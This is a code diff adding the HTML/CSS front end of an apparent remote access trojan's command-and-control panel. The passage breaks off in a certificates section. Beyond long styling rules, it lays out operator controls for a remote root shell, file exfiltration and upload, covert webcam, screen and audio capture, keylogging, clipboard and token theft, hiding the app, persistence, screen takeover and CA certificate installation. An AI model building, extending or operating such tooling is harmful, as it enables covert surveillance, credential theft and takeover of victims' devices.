@@ -1,0 +1,1975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote C&C Server (WebView)</title>
+    <style>
+        :root {
+            --bg-dark: #0a0a0f;
+            --bg-panel: #111118;
+            --bg-input: #08080d;
+            --bg-glass: rgba(17, 17, 24, 0.85);
+            --primary: #00e5ff;
+            --primary-dim: rgba(0, 229, 255, 0.15);
+            --primary-glow: 0 0 20px rgba(0, 229, 255, 0.2);
+            --success: #00e676;
+            --warning: #ffab00;
+            --danger: #ff1744;
+            --info: #00b0ff;
+            --text-main: #e0e6ed;
+            --text-muted: #5a6270;
+            --border: rgba(0, 229, 255, 0.1);
+            --border-strong: rgba(0, 229, 255, 0.25);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            --radius: 8px;
+        }
+        * { box-sizing: border-box; outline: none; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', -apple-system, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        /* === Scrollbar === */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(0, 229, 255, 0.2); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(0, 229, 255, 0.4); }
+        
+        /* === LOCAL INLINE LOADING STYLES === */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(10, 10, 15, 0.85);
+            backdrop-filter: blur(2px);
+            z-index: 50;
+            display: none; /* Flex when active */
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: var(--radius);
+        }
+        .container-with-loading {
+            position: relative;
+        }
+        .container-with-loading.loading .loading-overlay {
+            display: flex;
+        }
+        .spinner-sm {
+            width: 24px; height: 24px;
+            border: 2px solid rgba(0, 229, 255, 0.3);
+            border-top: 2px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* === NOTIFICATIONS === */
+        #notification-container {
+            position: fixed;
+            top: 60px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            pointer-events: none; 
+            max-height: calc(100vh - 80px);
+            overflow: hidden;
+        }
+        
+        .notification {
+            pointer-events: auto;
+            background: linear-gradient(145deg, var(--bg-panel), rgba(17, 17, 24, 0.95));
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--primary);
+            width: 340px;
+            padding: 12px 14px;
+            border-radius: var(--radius);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            transform: translateX(120%);
+            transition: transform 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+        }
+        
+        .notification.show { transform: translateX(0); }
+        
+        .notification-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+        
+        .notification-title {
+            font-weight: 700;
+            font-size: 12px;
+            color: var(--text-main);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        .notification-close {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 16px;
+            cursor: pointer;
+            line-height: 10px;
+            padding: 0;
+        }
+        .notification-close:hover { color: var(--danger); }
+        
+        .notification-body {
+            font-size: 11px;
+            color: var(--text-muted);
+            line-height: 1.4;
+            word-break: break-all;
+        }
+        
+        .notification-footer {
+            margin-top: 4px;
+            font-size: 9px;
+            color: var(--text-muted);
+            opacity: 0.7;
+            text-align: right;
+        }
+        
+        .notif-danger { border-left-color: var(--danger); }
+        .notif-danger .notification-title { color: var(--danger); }
+        .notif-warning { border-left-color: var(--warning); }
+        .notif-warning .notification-title { color: var(--warning); }
+        .notif-success { border-left-color: var(--success); }
+        .notif-success .notification-title { color: var(--success); }
+        .notif-info { border-left-color: var(--info); }
+        .notif-info .notification-title { color: var(--info); }
+
+        /* === Header === */
+        header {
+            background: linear-gradient(180deg, rgba(0, 229, 255, 0.05) 0%, var(--bg-panel) 100%);
+            padding: 0 20px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(20px);
+            user-select: none;
+        }
+        h1 {
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            background: linear-gradient(135deg, var(--primary), #80deea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .status-bar { display: flex; gap: 18px; font-size: 12px; align-items: center; }
+        .status-item { display: flex; align-items: center; gap: 6px; color: var(--text-muted); }
+        .status-dot { width: 7px; height: 7px; border-radius: 50%; background-color: var(--text-muted); transition: all 0.3s; }
+        .status-dot.active { background-color: var(--success); box-shadow: 0 0 10px var(--success), 0 0 20px rgba(0, 230, 118, 0.3); }
+        .status-dot.error { background-color: var(--danger); box-shadow: 0 0 10px rgba(255, 23, 68, 0.4); }
+        /* === Toolbar === */
+        .toolbar {
+            background: var(--bg-panel);
+            padding: 6px 20px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+        }
+        .nav-status-bar {
+            display: flex;
+            gap: 15px;
+            flex: 1;
+            background: var(--bg-dark);
+            padding: 5px 14px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+        .nav-item { display: flex; align-items: center; gap: 5px; }
+        .nav-value { color: var(--primary); font-weight: 600; }
+        /* === Inputs & Buttons === */
+        select, input[type="text"], input[type="number"], input[type="password"], input[type="file"] {
+            background-color: var(--bg-input);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 7px 12px;
+            border-radius: var(--radius);
+            font-size: 12px;
+            transition: all 0.25s ease;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        select:focus, input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(0, 229, 255, 0.1);
+        }
+        input[type="file"]::file-selector-button {
+            background: linear-gradient(135deg, rgba(0, 229, 255, 0.15), rgba(0, 229, 255, 0.05));
+            border: 1px solid var(--border-strong);
+            color: var(--primary);
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-right: 10px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        button {
+            border: none;
+            padding: 7px 14px;
+            border-radius: var(--radius);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-main);
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            transition: all 0.2s ease;
+            letter-spacing: 0.3px;
+        }
+        button:hover:not(:disabled) {
+            border-color: var(--border-strong);
+            box-shadow: var(--primary-glow);
+            transform: translateY(-1px);
+        }
+        button:active:not(:disabled) { transform: translateY(0); }
+        button:disabled { opacity: 0.35; cursor: not-allowed; filter: grayscale(0.5); }
+        .btn-primary { background: linear-gradient(135deg, rgba(0, 229, 255, 0.25), rgba(0, 229, 255, 0.1)); border-color: var(--primary); color: var(--primary); }
+        .btn-success { background: linear-gradient(135deg, rgba(0, 230, 118, 0.25), rgba(0, 230, 118, 0.08)); border-color: var(--success); color: var(--success); }
+        .btn-danger { background: linear-gradient(135deg, rgba(255, 23, 68, 0.25), rgba(255, 23, 68, 0.08)); border-color: var(--danger); color: var(--danger); }
+        .btn-info { background: linear-gradient(135deg, rgba(0, 176, 255, 0.2), rgba(0, 176, 255, 0.05)); border-color: var(--info); color: var(--info); }
+        .btn-warning { background: linear-gradient(135deg, rgba(255, 171, 0, 0.2), rgba(255, 171, 0, 0.05)); border-color: var(--warning); color: var(--warning); }
+        /* === Main Tabs === */
+        .tabs-container {
+            display: flex;
+            background: var(--bg-panel);
+            overflow-x: auto;
+            border-bottom: 1px solid var(--border);
+            gap: 2px;
+            padding: 0 10px;
+        }
+        .tab-btn {
+            padding: 10px 18px;
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            font-size: 12px;
+            white-space: nowrap;
+            letter-spacing: 0.5px;
+            transition: all 0.2s;
+        }
+        .tab-btn:hover { color: var(--text-main); background: rgba(0, 229, 255, 0.03); }
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+            background: linear-gradient(180deg, rgba(0, 229, 255, 0.06) 0%, transparent 100%);
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.3);
+        }
+        .tab-content { flex: 1; overflow: hidden; display: none; position: relative; }
+        .tab-content.active { display: flex; flex-direction: column; }
+        /* === Sub Tabs (right pane) === */
+        .sub-tabs {
+            display: flex;
+            background: var(--bg-dark);
+            border-bottom: 1px solid var(--border);
+            padding: 0 5px;
+        }
+        .sub-tab-btn {
+            padding: 8px 16px;
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .sub-tab-btn:hover { color: var(--text-main); }
+        .sub-tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+        .sub-tab-content { display: none; flex: 1; overflow: hidden; flex-direction: column; }
+        .sub-tab-content.active { display: flex; }
+        /* === Split Pane === */
+        .split-pane { display: flex; height: 100%; overflow: hidden; }
+        .pane-left {
+            flex: 1;
+            min-width: 350px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border);
+        }
+        .pane-right {
+            flex: 1.2;
+            background-color: var(--bg-dark);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        /* === Tables === */
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--border); }
+        th {
+            background: rgba(0, 229, 255, 0.04);
+            position: sticky;
+            top: 0;
+            color: var(--primary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 10px;
+            letter-spacing: 1px;
+        }
+        tr:hover { background-color: rgba(0, 229, 255, 0.03); cursor: pointer; }
+        /* === Grid System === */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 12px;
+            padding: 12px;
+            overflow-y: auto;
+        }
+        .card {
+            background: linear-gradient(145deg, var(--bg-panel), rgba(17, 17, 24, 0.6));
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            backdrop-filter: blur(10px);
+            transition: all 0.25s ease;
+        }
+        .card:hover {
+            border-color: var(--border-strong);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(0, 229, 255, 0.05);
+        }
+        .card h3 {
+            margin: 0;
+            font-size: 13px;
+            color: var(--primary);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 8px;
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
+        }
+        .card-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; font-size: 12px; }
+        /* === Shell === */
+        .shell-wrapper { display: flex; flex-direction: column; height: 100%; padding: 10px; gap: 8px; }
+        .shell-output {
+            flex: 1;
+            background: linear-gradient(180deg, #050508 0%, #0a0a10 100%);
+            color: var(--primary);
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            padding: 12px;
+            border-radius: var(--radius);
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-size: 13px;
+            border: 1px solid var(--border);
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+        .shell-input-row { display: flex; gap: 8px; align-items: center; }
+        .pwd-label {
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-weight: bold;
+            color: var(--primary);
+            padding: 7px 12px;
+            background: var(--bg-panel);
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            min-width: 120px;
+            font-size: 12px;
+            text-shadow: 0 0 8px rgba(0, 229, 255, 0.3);
+        }
+        /* === Storage === */
+        .storage-strip {
+            display: flex;
+            gap: 8px;
+            padding: 8px;
+            overflow-x: auto;
+            border-bottom: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.2);
+            min-height: 85px;
+        }
+        .storage-card {
+            min-width: 180px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            padding: 10px;
+            border-radius: var(--radius);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .storage-card:hover { border-color: var(--primary); box-shadow: var(--primary-glow); transform: translateY(-1px); }
+        .progress-bar { height: 4px; background: rgba(255,255,255,0.06); border-radius: 2px; margin: 6px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--primary), var(--success)); width: 0%; transition: width 0.5s ease; border-radius: 2px; }
+        /* === Modals === */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(8px);
+        }
+        .modal {
+            background: linear-gradient(145deg, var(--bg-panel), #0d0d14);
+            padding: 24px;
+            border-radius: 12px;
+            width: 480px;
+            max-width: 95%;
+            border: 1px solid var(--border-strong);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(0, 229, 255, 0.05);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 12px;
+        }
+        .modal-header h2 { margin: 0; font-size: 16px; color: var(--primary); letter-spacing: 0.5px; }
+        .close-btn { background: none; border: none; font-size: 22px; color: var(--text-muted); cursor: pointer; padding: 0; line-height: 1; }
+        .close-btn:hover { color: var(--danger); text-shadow: 0 0 10px rgba(255, 23, 68, 0.5); }
+        .modal-body-text { font-size: 13px; color: var(--text-main); margin-bottom: 20px; line-height: 1.5; }
+        .modal-footer { display: flex; justify-content: flex-end; gap: 10px; }
+        
+        /* === Forms === */
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; margin-bottom: 5px; color: var(--text-muted); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-group input, .form-group select { width: 100%; box-sizing: border-box; }
+        input[type="range"] { width: 100%; accent-color: var(--primary); }
+        /* === Context Menu === */
+        #context-menu {
+            position: absolute;
+            display: none;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-strong);
+            border-radius: var(--radius);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            z-index: 2000;
+            min-width: 160px;
+            padding: 4px 0;
+            backdrop-filter: blur(20px);
+        }
+        .ctx-item {
+            padding: 8px 14px;
+            cursor: pointer;
+            font-size: 12px;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.15s;
+        }
+        .ctx-item:hover { background: rgba(0, 229, 255, 0.1); color: var(--primary); }
+        .ctx-divider { height: 1px; background: var(--border); margin: 3px 0; }
+        /* === Utilities === */
+        .d-none { display: none !important; }
+        .text-success { color: var(--success); }
+        .text-error { color: var(--danger); }
+        .text-info { color: var(--info); }
+        .text-warning { color: var(--warning); }
+        .flex-row { display: flex; gap: 8px; align-items: center; }
+        .w-full { width: 100%; }
+        /* === Stream === */
+        .stream-container { 
+            flex: 1; 
+            background: #000; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            position: relative; 
+        }
+        .stream-container img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .stream-overlay {
+            position: absolute; top: 10px; left: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 5px 12px;
+            border-radius: var(--radius);
+            font-family: monospace;
+            pointer-events: none;
+            border: 1px solid var(--border);
+            font-size: 12px;
+        }
+        .log-container {
+            flex: 1;
+            background: linear-gradient(180deg, #050508, #0a0a0f);
+            padding: 10px;
+            overflow-y: auto;
+            font-family: 'Cascadia Code', monospace;
+            font-size: 11px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin: 8px;
+        }
+        .log-entry { margin-bottom: 3px; border-bottom: 1px solid rgba(0, 229, 255, 0.04); padding-bottom: 2px; }
+        .log-time { color: var(--text-muted); margin-right: 10px; }
+        .preview-area { flex: 1; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; padding: 10px; }
+        .preview-area img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .preview-text { width: 100%; height: 100%; background: #000; color: var(--primary); font-family: monospace; padding: 10px; overflow: auto; white-space: pre; border: none; resize: none; }
+        /* === Boxed section === */
+        .info-box {
+            background: linear-gradient(145deg, var(--bg-panel), rgba(0, 229, 255, 0.02));
+            border: 1px solid var(--border-strong);
+            border-radius: var(--radius);
+            padding: 14px;
+            margin: 8px 0;
+        }
+        .info-box h4 {
+            color: var(--primary);
+            font-size: 12px;
+            margin: 0 0 10px 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        /* === Section Labels === */
+        .section-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            padding: 10px 12px 4px;
+            font-weight: 700;
+        }
+        /* === Streaming tab unified === */
+        .stream-controls {
+            padding: 10px 14px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+        }
+        .stream-stats {
+            margin-left: auto;
+            font-family: 'Cascadia Code', monospace;
+            display: flex;
+            gap: 16px;
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+    <!-- Notification Container -->
+    <div id="notification-container"></div>
+
+    <!-- Header -->
+    <header>
+        <h1>⬡ REMOTE C&C</h1>
+        <div class="status-bar">
+            <div id="server-status" class="status-item">
+                <div class="status-dot" id="status-dot"></div>
+                <span id="status-text">Server Stopped</span>
+            </div>
+            <div class="status-item">
+                <span>Clients:</span>
+                <span id="client-count" class="nav-value">0</span>
+            </div>
+            <div class="status-item">
+                <span>Captures:</span>
+                <span>./captures</span>
+            </div>
+        </div>
+    </header>
+    <!-- Controls -->
+    <div class="toolbar">
+        <select id="client-selector" style="width: 320px;">
+            <option value="ALL_CLIENTS">ALL CLIENTS</option>
+        </select>
+        <div class="nav-status-bar">
+            <div class="nav-item"><span>🔋</span><span id="battery-text">N/A</span></div>
+            <div class="nav-item"><span>📶</span><span id="network-text">N/A</span></div>
+            <div class="nav-item" style="margin-left: auto;"><span>🕒</span><span id="time-text">N/A</span></div>
+        </div>
+        <div style="display: flex; gap: 8px; margin-left: auto;">
+            <button id="start-btn" class="btn-success" onclick="api.start_server()">▶ START</button>
+            <button id="stop-btn" class="btn-danger" onclick="api.stop_server()" disabled>■ STOP</button>
+        </div>
+    </div>
+    <!-- Main Tabs -->
+    <div class="tabs-container">
+        <button class="tab-btn active" onclick="switchTab('terminal')">⬡ Terminal</button>
+        <button class="tab-btn" onclick="switchTab('streaming')">◉ Streaming</button>
+        <button class="tab-btn" onclick="switchTab('commands')">⚡ Commands</button>
+        <button class="tab-btn" onclick="switchTab('usb')">⬒ USB Monitor</button>
+        <button class="tab-btn" onclick="switchTab('scheduler')">◷ Scheduler</button>
+        <button class="tab-btn" onclick="switchTab('triggers')">⚡ Triggers</button>
+    </div>
+    <!-- ============ TAB: TERMINAL ============ -->
+    <div id="tab-terminal" class="tab-content active">
+        <div class="split-pane">
+            <!-- LEFT: Shell -->
+            <div class="pane-left">
+                <div class="shell-wrapper">
+                    <div id="shell-output" class="shell-output"></div>
+                    <div class="shell-input-row">
+                        <div id="pwd-label" class="pwd-label">[root]></div>
+                        <input type="text" id="cmd-input" class="w-full" placeholder="Enter command..." autocomplete="off">
+                        <button class="btn-primary" onclick="executeCommand()">⏎</button>
+                        <button class="btn-info" onclick="api.get_location()">📍</button>
+                        <button onclick="api.clear_shell()">✕</button>
+                        <button class="btn-danger" id="cancel-btn" onclick="api.cancel_command()" disabled>⊘</button>
+                    </div>
+                </div>
+            </div>
+            <!-- RIGHT: Sub-tabbed area -->
+            <div class="pane-right">
+                <div class="sub-tabs">
+                    <button class="sub-tab-btn active" onclick="switchSubTab('files')">📁 File Explorer</button>
+                    <button class="sub-tab-btn" onclick="switchSubTab('settings')">⚙ Settings</button>
+                </div>
+                <!-- Sub: File Explorer -->
+                <div id="subtab-files" class="sub-tab-content active">
+                    <div id="storage-container" class="storage-strip"></div>
+                    <div style="padding: 8px; display: flex; gap: 8px; border-bottom: 1px solid var(--border); background: var(--bg-panel);">
+                        <input type="text" id="search-input" placeholder="Search..." style="width: 180px;">
+                        <button class="btn-info" onclick="api.search_files(document.getElementById('search-input').value)">🔍</button>
+                        <button onclick="api.go_back()">←</button>
+                        <button onclick="api.go_home()">⌂</button>
+                        <button onclick="api.refresh_directory()">↻</button>
+                        <div style="flex: 1"></div>
+                        <button class="btn-success" onclick="triggerUpload()">↑ Upload</button>
+                        <input type="file" id="file-upload-input" style="display: none;" onchange="handleFileUpload(this)">
+                    </div>
+                    <div style="display: flex; flex: 1; overflow: hidden;">
+                        <div style="flex: 1; overflow: auto;">
+                            <table id="file-table">
+                                <thead>
+                                    <tr>
+                                        <th style="width: 40%">Name</th>
+                                        <th style="width: 15%">Type</th>
+                                        <th style="width: 15%">Size</th>
+                                        <th style="width: 30%">Modified</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="file-list-body"></tbody>
+                            </table>
+                        </div>
+                        <div style="width: 250px; border-left: 1px solid var(--border); display: flex; flex-direction: column;">
+                            <div style="padding: 8px; border-bottom: 1px solid var(--border); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--primary); font-weight: 600;">Preview</div>
+                            <div id="preview-area" class="preview-area">
+                                <span style="color: var(--text-muted); font-size: 12px;">No preview</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Sub: Settings -->
+                <div id="subtab-settings" class="sub-tab-content">
+                    <div style="padding: 8px; border-bottom: 1px solid var(--border); background: var(--bg-panel);">
+                        <button class="btn-info" onclick="api.cmd_get_system_settings()">↻ Refresh Settings</button>
+                    </div>
+                    <div id="settings-container" class="grid-container"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ============ TAB: STREAMING ============ -->
+    <div id="tab-streaming" class="tab-content">
+        <div class="stream-controls">
+            <button class="btn-info safe-action" onclick="startStreamAction('webcam')">◉ Webcam</button>
+            <button class="btn-info safe-action" onclick="startStreamAction('screen')">⬒ Screen</button>
+            <button class="btn-danger safe-action" onclick="api.stop_streaming()">■ Stop Video</button>
+            <div style="width: 1px; height: 20px; background: var(--border); margin: 0 4px;"></div>
+            <button class="btn-success safe-action" onclick="api.start_audio_listen()">🎤 Listen</button>
+            <button class="btn-success safe-action" onclick="api.start_audio_listen1()">🎤 Listen 2</button>
+            <button class="btn-danger safe-action" onclick="api.stop_audio_stream()">■ Stop Audio</button>
+            <div class="stream-stats">
+                <span id="stream-mode">Mode: Stopped</span>
+                <span id="stream-fps">FPS: 0</span>
+                <span id="stream-buf">Buf: 0</span>
+            </div>
+        </div>
+        <!-- Container with Loading Support -->
+        <div class="stream-container container-with-loading" id="stream-view-container">
+            <div class="loading-overlay">
+                <div class="spinner-sm"></div>
+                <div style="color: var(--primary); font-size: 12px; margin-top: 10px;">Starting Stream...</div>
+            </div>
+            <div class="stream-overlay" id="stream-placeholder">Waiting for stream...</div>
+            <img id="stream-img" src="" style="display: none;" alt="Stream">
+        </div>
+        <!-- Audio info overlay -->
+        <div style="position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); border: 1px solid var(--border); border-radius: var(--radius); padding: 6px 14px; font-size: 11px; color: var(--text-muted); font-family: monospace;">
+            Audio: 44.1kHz 16-bit Stereo
+        </div>
+    </div>
+    <!-- ============ TAB: COMMANDS ============ -->
+    <div id="tab-commands" class="tab-content">
+        <div class="grid-container">
+            <!-- System -->
+            <div class="card">
+                <h3>⚙ System</h3>
+                <div class="form-group"><label>Volume</label><input type="range" min="0" max="100" value="50" oninput="document.getElementById('vol-val').innerText=this.value" onchange="api.cmd_set_volume(this.value)"><span id="vol-val" style="float:right; font-size: 11px;">50%</span></div>
+                <div class="form-group"><label>Brightness</label><input type="range" min="0" max="100" value="100" onchange="api.cmd_set_brightness(this.value)"></div>
+                <div class="flex-row">
+                    <button class="btn-info w-full safe-action" onclick="api.cmd_screenshot()">📷 Screenshot</button>
+                    <button class="btn-info w-full safe-action" onclick="api.cmd_webcam()">📹 Webcam</button>
+                </div>
+            </div>
+            <!-- Network -->
+            <div class="card">
+                <h3>🌐 Network</h3>
+                <div class="flex-row" style="flex-wrap: wrap;">
+                    <button class="btn-info safe-action" onclick="api.cmd_wifi_scan()">WiFi</button>
+                    <button class="btn-info safe-action" onclick="api.cmd_network_scan()">Net Scan</button>
+                    <button class="btn-info safe-action" onclick="api.cmd_bluetooth_scan()">BT Scan</button>
+                </div>
+                <div class="form-group" style="margin-top:12px">
+                    <label>Open URL</label>
+                    <div class="flex-row">
+                        <input type="text" id="url-input" placeholder="https://...">
+                        <button class="btn-info" onclick="api.cmd_open_url(document.getElementById('url-input').value)">Go</button>
+                    </div>
+                </div>
+            </div>
+            <!-- Actions -->
+            <div class="card">
+                <h3>🚀 Actions</h3>
+                <div class="form-group"><label>Launch App</label><input type="text" id="app-input"><button class="w-full" onclick="api.cmd_launch_app(document.getElementById('app-input').value)">Launch</button></div>
+                <div class="form-group"><label>Notify</label>
+                    <input type="text" id="notif-title" placeholder="Title">
+                    <input type="text" id="notif-body" placeholder="Body" style="margin-top:5px">
+                    <select id="notif-badge" style="margin-top:5px">
+                        <option value="info">ℹ Info</option>
+                        <option value="warning">⚠ Warning</option>
+                        <option value="error">✕ Error</option>
+                        <option value="success">✓ Success</option>
+                        <option value="question">? Question</option>
+                    </select>
+                    <button class="w-full" style="margin-top:5px" onclick="api.cmd_send_notification(document.getElementById('notif-title').value, document.getElementById('notif-body').value, document.getElementById('notif-badge').value)">Send</button>
+                </div>
+            </div>
+            <!-- Info -->
+            <div class="card">
+                <h3>ℹ Info</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_device_info()">Device Info</button>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_clipboard()">Clipboard</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_tokens()">Tokens</button>
+            </div>
+            <!-- Privilege -->
+            <div class="card">
+                <h3>🔐 Privilege</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_check_privileges()">Check Privs</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_request_root()">Request Root</button>
+                <div class="form-group"><label>Root Cmd</label><input type="text" id="root-cmd"><button class="btn-warning w-full" onclick="api.cmd_execute_root(document.getElementById('root-cmd').value)">Run</button></div>
+            </div>
+            <!-- Persistence -->
+            <div class="card">
+                <h3>🔒 Persistence</h3>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_drivers()">Drivers</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_hide_app()">Hide App</button>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_add_persistence()">Add Persist</button>
+            </div>
+            <!-- Media -->
+            <div class="card">
+                <h3>🎵 Media</h3>
+                <div class="form-group">
+                    <label>Play Audio (Path)</label>
+                    <input type="text" id="play-audio-path" placeholder="C:\Music\song.mp3">
+                    <div class="flex-row" style="margin-top:5px">
+                        <button class="btn-success w-full" onclick="api.cmd_play_audio(document.getElementById('play-audio-path').value)">▶ Play</button>
+                        <button class="btn-danger w-full" onclick="api.cmd_stop_audio()">■ Stop</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Screen Takeover (Path)</label>
+                    <input type="text" id="takeover-path" placeholder="C:\Images\takeover.jpg">
+                    <div class="flex-row" style="margin-top:5px">
+                        <button class="btn-warning w-full" onclick="api.cmd_screen_takeover(document.getElementById('takeover-path').value)">Start</button>
+                        <button class="btn-danger w-full" onclick="api.cmd_stop_takeover()">Stop</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Record Audio</label>
+                    <div class="flex-row">
+                        <input type="number" id="record-duration" value="5" min="1" max="60" style="width: 70px">
+                        <span style="font-size: 11px;">sec</span>
+                        <button class="btn-info w-full safe-action" onclick="api.cmd_record_audio(document.getElementById('record-duration').value)">● Record</button>
+                    </div>
+                </div>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_get_wallpaper()">Get Wallpaper</button>
+            </div>
+            <!-- Keylogger -->
+            <div class="card">
+                <h3>⌨ Keylogger</h3>
+                <button class="btn-warning w-full safe-action" onclick="api.cmd_start_keylogger()">Start</button>
+                <button class="btn-danger w-full safe-action" onclick="api.cmd_stop_keylogger()">Stop</button>
+            </div>
+            <!-- Task Manager -->
+            <div class="card">
+                <h3>📋 Task Manager</h3>
+                <div class="form-group">
+                    <label>Kill Task (PID/Name)</label>
+                    <div class="flex-row">
+                        <input type="text" id="kill-task-id" placeholder="PID or Name">
+                        <button class="btn-danger" onclick="api.cmd_kill_task(document.getElementById('kill-task-id').value)">Kill</button>
+                    </div>
+                </div>
+                <button class="btn-info w-full safe-action" onclick="api.cmd_list_tasks()">List Tasks</button>
+            </div>
+            <!-- Certificates -->
+            <div class="card">
+                <h3>🔒 Certificates</h3>
+                <div class="form-group">
+                    <label>Install CA Cert (.crt)</label>
